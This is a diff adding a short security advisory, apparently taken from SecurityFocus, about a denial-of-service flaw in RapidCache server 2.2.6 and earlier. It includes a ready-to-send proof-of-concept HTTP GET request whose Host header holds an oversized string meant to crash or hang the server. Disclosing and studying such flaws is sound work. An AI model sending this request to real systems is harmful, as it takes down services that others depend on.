@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/9427/info
+
+It has been reported that RapidCache server may be prone to a denial of service vulnerability that may allow an attacker to cause the server to crash or hang. The issue presents itself when an attacker sends an excessively large string value to the server via the 'Host' argument through an HTTP GET request.
+
+RapidCache versions 2.2.6 and prior have been reported to be prone to this issue.
+
+GET / HTTP/1.1
+Accept: */*..Accept-Language: en-gb
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0
+Host:
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+bbbbbbbbbbbbbbbccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
+cccccddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
+dddddddddddddddddddddddddddddddddddddddddddddddddddddddeeeeeeeeeeeeBBBBXXX
+X:8080
+Connection: Keep-Alive
